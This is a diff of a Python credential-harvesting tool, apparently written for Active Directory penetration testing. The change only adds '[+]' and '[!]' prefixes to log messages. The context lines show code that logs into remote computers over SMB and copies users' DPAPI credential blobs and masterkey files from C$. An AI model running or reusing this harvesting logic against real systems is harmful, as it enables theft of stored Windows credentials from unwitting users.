@@ -65,7 +65,7 @@ def Get_blob_and_mkf(computers_list, users_list, username, password, domain, lmh
             if len(answer) == 0:
                 answer = resolver.resolve(current_computer, "A", tcp=False)
                 if len(answer) == 0:
-                    print("DNS resolution for "+str(current_computer) + " has failed.")
+                    print("[!] DNS resolution for "+str(current_computer) + " has failed.")
                     sys.exit(1)
             else:
                 answer = str(answer[0])
@@ -85,7 +85,7 @@ def Get_blob_and_mkf(computers_list, users_list, username, password, domain, lmh
                         if str(current_user[0]).lower() == str(current_user_folder).lower():
                             try:
                                 if debugmax is True:
-                                    print("Find existing user " + str(current_user[0]) + " on computer " + str(current_computer) )
+                                    print("[+] Find existing user " + str(current_user[0]) + " on computer " + str(current_computer) )
                                 response = smbClient.listPath("C$", "\\users\\" + current_user[0] + "\\appData\\Roaming\\Microsoft\\Credentials\\*")
                                 is_there_any_blob_for_this_user = False
                                 count_blobs = 0
@@ -130,8 +130,8 @@ def Get_blob_and_mkf(computers_list, users_list, username, password, domain, lmh
                                             wf        = open(mkfFolder + "/" + mkf,'wb')
                                             smbClient.getFile("C$", "\\users\\" + current_user[0] + "\\appData\\Roaming\\Microsoft\\Protect\\" + current_user[1] + "\\" + mkf, wf.write)
                                     if debugmax is True:
-                                        print("New credentials found for user " + str(current_user[0]) + " on " + str(current_computer) + " :")
-                                        print("Retrieved " + str(count_blobs) + " credential blob(s) and " + str(count_mkf) + " masterkey file(s)")	
+                                        print("[+] New credentials found for user " + str(current_user[0]) + " on " + str(current_computer) + " :")
+                                        print("[+] Retrieved " + str(count_blobs) + " credential blob(s) and " + str(count_mkf) + " masterkey file(s)")	
                             except KeyboardInterrupt:
                                 os._exit(1)
                             except:
@@ -144,13 +144,13 @@ def Get_blob_and_mkf(computers_list, users_list, username, password, domain, lmh
             os._exit(1)
         except dns.exception.DNSException:
             if debugmax is True:
-                print("Error on computer "+str(current_computer))
+                print("[!] Error on computer "+str(current_computer))
                 import traceback
                 traceback.print_exc()
             pass
         except:
             if debug is True:
-                print("Debug : Could not connect to computer : " + str(current_computer))
+                print("[!] Debug : Could not connect to computer : " + str(current_computer))
             if debugmax is True:
                 import traceback
                 traceback.print_exc()
